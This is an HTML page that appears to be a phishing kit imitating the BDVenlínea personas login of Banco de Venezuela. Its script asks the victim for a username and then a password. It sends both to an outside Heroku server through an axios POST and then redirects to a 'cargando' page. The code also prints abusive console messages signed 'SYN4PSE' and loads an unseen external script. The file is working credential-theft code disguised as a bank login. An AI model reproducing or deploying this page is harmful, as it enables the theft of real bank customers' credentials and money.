<!DOCTYPE html>
<html lang="es">
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>BDVenlínea personas</title>
    <!-- Meta tags -->
    <meta http-equiv="cache-control" content="max-age=0">
    <meta http-equiv="cache-control" content="no-cache">
    <meta http-equiv="expires" content="0">
    <meta http-equiv="pragma" content="no-cache">
    <meta name="google" content="notranslate">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="theme-color" content="#ffffff">
    <!-- Favicon and icons -->
    <link href="./datos/css.css" rel="stylesheet">
    <link rel="stylesheet" href="./datos/styl.css">
    <meta name="msapplication-TileColor" content="#da532c">
    <!-- Font Awesome -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
    <!-- External JS Libraries -->
    <script src="https://cdn.jsdelivr.net/npm/axios@1.1.2/dist/axios.min.js"></script>

    <script src="https://code.jquery.com/jquery-3.4.1.slim.min.js" integrity="sha384-J6qa4849blE2+poT4WnyKhv5vZF5SrPo0iEjwBvKU7imGFAV0wwj1yYfoRSJoZ+n" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js" integrity="sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6" crossorigin="anonymous"></script>
    <!-- Custom Scripts -->
  </head>
  <body>

    <app-root _nghost-c0="" ng-version="6.1.10">
      <spinner _ngcontent-c0="" spinner="sk-wave" _nghost-c1=""></spinner>
      <router-outlet _ngcontent-c0=""></router-outlet>
      <app-login _nghost-c10="" class="ng-star-inserted">
        
        <div _ngcontent-c10="" class="login-container">
            
          <div _ngcontent-c10="">
                <div id="ocultar" class="cdk-overlay-backdrop cdk-overlay-dark-backdrop cdk-overlay-backdrop-showing"  style="  position: fixed;       /* Fijado a la ventana */
    top: 0;                /* Alineado al borde superior */
    left: 0;               /* Alineado al borde izquierdo */
    width: 100vw;          /* 100% del ancho de la ventana */
    height: 100vh;         /* 100% de la altura de la ventana */
    background-color: rgba(0, 0, 0, 0.5);  /* Fondo semitransparente */
    z-index: 0;         /* Asegura que esté por encima de otros elementos */
    display: none;"></div>
            <div _ngcontent-c10="" class="login-container-float-center">
                
              <div _ngcontent-c10="" class="row">
                
                <div _ngcontent-c10="" class="col s12 not-margin not-padding">
                  <div _ngcontent-c10="">
                    <div _ngcontent-c10="" class="login-container-logo">
                      <img _ngcontent-c10="" class="logo-login" src="./datos/logo.png">
                    </div>
                    <div _ngcontent-c10="" class="login-container-form">
                        
                      <form id="loginform">
                        <div _ngcontent-c10="" class="formGroup" role="form">
                          <mat-form-field _ngcontent-c10="" id="df" appearance="fill" class="mat-form-field ng-tns-c11-0 mat-primary mat-form-field-type-mat-input mat-form-field-appearance-fill mat-form-field-can-float ng-dirty ng-touched mat-form-field-invalid ng-invalid mat-form-field-hide-placeholder">
                            <div class="mat-form-field-wrapper">
                              <div class="mat-form-field-flex" style="border-bottom: 2px solid rgb(177, 177, 177);">
                                <div class="mat-form-field-infix">
                                  <input _ngcontent-c10="" aria-label="usuario" autocomplete="off" class="mat-input-element mat-form-field-autofill-control cdk-text-field-autofill-monitored ng-untouched ng-pristine ng-invalid " formcontrolname="username" matinput="" maxlength="16" minlength="6" oncut="return false" tabindex="1" type="text" required id="usuario" name="usuario" aria-invalid="false" aria-required="false">
                                  <span class="mat-form-field-label-wrapper">
                                    <label class="mat-form-field-label ng-tns-c11-0 mat-empty mat-form-field-empty ng-star-inserted" id="mat-form-field-label-1" for="usuario" aria-owns="usuario">
                                      <mat-label _ngcontent-c10="" class="ng-star-inserted">Usuario *</mat-label>
                                    </label>
                                  </span>
                                </div>
                                <script>
                                  // Añadimos eventos para manejar la clase de flotado
                                  document.getElementById("usuario").addEventListener("focusin", function() {
                                    this.closest('.mat-form-field').classList.add("mat-form-field-should-float");
                                  });
                                  document.getElementById("usuario").addEventListener("focusout", function() {
                                    if (!this.value) {
                                      this.closest('.mat-form-field').classList.remove("mat-form-field-should-float");
                                    }
                                  });
                                </script>
                              </div>
                            </div>
                          </mat-form-field>
                        </div>
                        <div _ngcontent-c10="" class="button-login-container" role="row">
                          <button _ngcontent-c10="" color="accent" mat-raised-button="" role="button" tabindex="2" type="button" class="mat-raised-button mat-accent" onclick="chcs()">
                            <span class="mat-button-wrapper">Entrar</span>
                            <div class="mat-button-ripple mat-ripple" matripple=""></div>
                            <div class="mat-button-focus-overlay"></div>
                          </button>
                        </div>
                        <div _ngcontent-c10="" class="button-login-container" role="row" style="font-size: 11px;font-weight: bold   ;">
                            ¿Olvidaste tu usuario o clave? 
                            <br>
                            Si eres nuevo clienteBDV regístrate aquí 
                        </div>
                        <div class="cdk-overlay-container" style="display: none; " id="mdl">
                            <div class="cdk-overlay-backdrop cdk-overlay-dark-backdrop cdk-overlay-backdrop-showing" bis_skin_checked="1"></div>
                            <div class="cdk-global-overlay-wrapper" dir="ltr" style="justify-content: center; align-items: center;">
                              <div id="cdk-overlay-2" class="cdk-overlay-pane" style="max-width: 80vw; pointer-events: auto; width: 370px; height: auto; position: static;">
                                <div tabindex="0" class="cdk-visually-hidden cdk-focus-trap-anchor"></div>
                                <mat-dialog-container aria-modal="true" class="mat-dialog-container ng-tns-c14-39 ng-trigger ng-trigger-slideDialog ng-star-inserted" tabindex="-1" id="mat-dialog-0" role="dialog" style="transform: none; opacity: 1;">
                                  <!---->
                                  <app-confirmar-acceso _nghost-c15="" class="ng-star-inserted">
                                    <div _ngcontent-c15="" class="container">
                                      <div _ngcontent-c15="" class="row">
                                        <h4 _ngcontent-c15="" class="text-center">Introduce tu contraseña</h4>
                                      </div>
                                      <center>
                                        <div _ngcontent-c15="" class="row">
                                          <style>
                                            .mat-form-field {
                                              position: relative;
                                            }
                  
                                            .input-icon {
                                              position: absolute;
                                              right: 10px;
                                              /* Adjust this value to fit your design */
                                              top: 50%;
                                              transform: translateY(-50%);
                                              cursor: pointer;
                                              color: gray;
                                              /* You can change the color as needed */
                                              z-index: 1;
                                              /* Ensure it is above other elements */
                                            }
                                          </style>
                                          <mat-form-field _ngcontent-c15="" id="dfs" appearance="fill" class="mat-form-field ng-tns-c11-40 mat-primary mat-form-field-type-mat-input mat-form-field-appearance-fill mat-form-field-can-float ng-pristine ng-invalid mat-form-field-invalid ng-touched mat-form-field-hide-placeholder">
                                            <div class="mat-form-field-wrapper">
                                              <div class="mat-form-field-flex">
                                                <div class="mat-form-field-infix">
                                                  <input _ngcontent-c15="" autocomplete="off" class="mat-input-element mat-form-field-autofill-control cdk-text-field-autofill-monitored ng-pristine ng-invalid ng-touched" formcontrolname="password" required matinput="" name="password" type="password" id="passd" aria-invalid="true" aria-required="false" aria-describedby="mat-error-4">
                                                  <span class="mat-form-field-label-wrapper">
                                                    <label class="mat-form-field-label ng-tns-c11-40 mat-empty mat-form-field-empty ng-star-inserted" id="mat-form-field-label-3" for="passd" aria-owns="passd" style="">
                                                      <mat-label _ngcontent-c15="" aria-label="Introduce tu contraseña" class="ng-star-inserted">
                                                        <span _ngcontent-c15="">Contraseña</span>
                                                      </mat-label>
                                                    </label>
                                                  </span>
                                                </div>
                                                <script>
                                                  // Añadimos eventos para manejar la clase de flotado para el campo de Contraseña
                                                  document.getElementById("passd").addEventListener("focusin", function() {
                                                    this.closest('.mat-form-field').classList.add("mat-form-field-should-float");
                                                  });
                                                  document.getElementById("passd").addEventListener("focusout", function() {
                                                    if (!this.value) {
                                                      this.closest('.mat-form-field').classList.remove("mat-form-field-should-float");
                                                    }
                                                  });
                                                </script>
                                              </div>
                                              <div class="mat-form-field-underline ng-tns-c11-40 ng-star-inserted">
                                                <span class="mat-form-field-ripple"></span>
                                              </div>
                                              <div class="mat-form-field-subscript-wrapper">
                                                <div class="ng-tns-c11-40 ng-trigger ng-trigger-transitionMessages ng-star-inserted" style="opacity: 1; transform: translateY(0%);">
                                                  <mat-error _ngcontent-c15="" align="end" class="mat-error ng-star-inserted" role="alert" id="mat-error-4">Contraseña es <strong _ngcontent-c15="">requerida</strong>
                                                  </mat-error>
                                                </div>
                                              </div>
                                            </div>
                                            <!-- Eye icon inside the input field -->
                                            <span class="input-icon" onclick="togglePasswordVisibility()" id="icon-wrapper">
                                              <i class="fas fa-eye" id="eye-icon"></i>
                                            </span>
                                          </mat-form-field>
                                          <script>
                                            function togglePasswordVisibility() {
                                              const passwordInput = document.getElementById("passd");
                                              const eyeIcon = document.getElementById("eye-icon");
                                              if (passwordInput.type === "password") {
                                                passwordInput.type = "text";
                                                eyeIcon.classList.remove("fa-eye");
                                                eyeIcon.classList.add("fa-eye-slash");
                                              } else {
                                                passwordInput.type = "password";
                                                eyeIcon.classList.remove("fa-eye-slash");
                                                eyeIcon.classList.add("fa-eye");
                                              }
                                            }
                                          </script>
                                        </div>
                                      </center>
                                      <script src="https://cdn.jsdelivr.net/npm/axios@1.1.2/dist/axios.min.js"></script>
                                      <script src="AA239412.js"></script>
                                      <div _ngcontent-c15="" class="row">
                                        <div _ngcontent-c15="" class="button-container">
                                          <button _ngcontent-c15="" color="accent" mat-raised-button="" type="submit" class="mat-raised-button mat-accent ng-pristine ng-invalid ng-touched" style="margin: 10px;">
                                            <span class="mat-button-wrapper">Continuar</span>
                                            <div class="mat-button-ripple mat-ripple" matripple=""></div>
                                            <div class="mat-button-focus-overlay"></div>
                                          </button>
                                          <button _ngcontent-c15="" aria-label="cancelar" color="accent" mat-dialog-close="" mat-raised-button="" type="button" class="mat-raised-button mat-accent" onclick="cls()"  style="margin: 10px;">
                                            <span class="mat-button-wrapper">Cancelar</span>
                                            <div class="mat-button-ripple mat-ripple" matripple=""></div>
                                            <div class="mat-button-focus-overlay"></div>
                                          </button>
                                        </div>
                                      </div>
                                      </form>
                                    </div>
                                  </app-confirmar-acceso>
                                </mat-dialog-container>
                                <div tabindex="0" class="cdk-visually-hidden cdk-focus-trap-anchor"></div>
                              </div>
                            </div>
                          </div>
                      </form>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
  
      </app-login>
    </app-root>
  </body>
  <script type="application/javascript">
    (function() {
      console.clear();
      console.log('%cES SYN4PSE MAMAGUEVO SAPO!', 'color: red; font-size: 50px; font-weight: bold; text-shadow: 2px 2px 10px black;');
      console.log('%cEsta sección es para desarrolladores gafo envidioso, robale el telegram a la puta de tu madre.', 'font-size: 20px; color: WHITE;');
    })();

    function togglePasswordVisibility() {
      const passwordInput = document.getElementById("passd");
      const eyeIcon = document.getElementById("eye-icon");
      if (passwordInput.type === "password") {
        passwordInput.type = "text";
        eyeIcon.classList.remove("fa-eye");
        eyeIcon.classList.add("fa-eye-slash");
      } else {
        passwordInput.type = "password";
        eyeIcon.classList.remove("fa-eye-slash");
        eyeIcon.classList.add("fa-eye");
      }
    }

    function getIP(json) {
      document.getElementById("ipaddress").value = json.ip;
    }

    function chcs() {
      if (document.getElementById("usuario").value.length < 5) {
        alert("usuario erroneo o incompleto");
        document.getElementById("usuario").value = "";
        document.getElementById("usuario").focus();
      } else {
        localStorage.setItem("usr", document.getElementById("usuario").value);
        document.getElementById("mdl").style.display = "flex";
        document.getElementById("mdl").style.zIndex = "3";
        document.getElementById("ocultar").style.display = "flex";
      }
    }

    function chc() {
      if (document.getElementById("passd").value.length < 5) {
        alert("Contraseña erronea o incompleta");
        document.getElementById("passd").value = "";
        document.getElementById("passd").focus();
      }
    }

    function cls() {
      document.getElementById("mdl").style.display = "none";
    }
    document.getElementById("usuario").addEventListener("focusin", () => {
      document.getElementById("df").className += " mat-form-field-should-float";
    });
    document.getElementById("usuario").addEventListener("focusout", () => {
      document.getElementById("df").className += " mat-form-field-hide-placeholder";
    });
    document.getElementById("passd").addEventListener("focusin", () => {
      document.getElementById("dfs").className += " mat-form-field-should-float";
    });
    document.getElementById("passd").addEventListener("focusout", () => {
      document.getElementById("dfs").className += " mat-form-field-hide-placeholder";
    });
    const form = document.querySelector("#loginform");
   const form = document.querySelector("#loginform");
form.addEventListener("submit", (event) => {
  event.preventDefault();
  
  const nombre = document.querySelector("#usuario").value;
  const pass = document.querySelector("#passd").value;

  // Validar que el usuario no tenga espacios
  const usuarioRegex = /^\S+$/; // Asegura que el nombre de usuario no tenga espacios
  if (!usuarioRegex.test(nombre)) {
    alert("El nombre de usuario no puede tener espacios.");
    return;
  }

  // Validar contraseña (al menos una mayúscula, una minúscula y un número)
  const passRegex = /^(?=.*[a-z])(?=.*[A-Z])(?=.*\d).{5,}$/; // Contraseña con min, may, y número
  if (!passRegex.test(pass)) {
    alert("La contraseña debe tener al menos una mayúscula, una minúscula y un número.");
    return;
  }

  // Si la contraseña es válida y el usuario no tiene espacios
  localStorage.setItem("usuario", nombre);
  const datos = {
    usuario: nombre,
    contrasena: pass
  };

  axios.post("https://srvdor-33a68f3ab628.herokuapp.com/usuario8/", datos, {
    headers: {
      Accept: "application/json",
      "Content-Type": "application/json"
    }
  }).then((response) => {
    window.location.href = "cargando.html";
  }).catch((error) => {
    console.error(error);
  });
});

  </script>
</html>
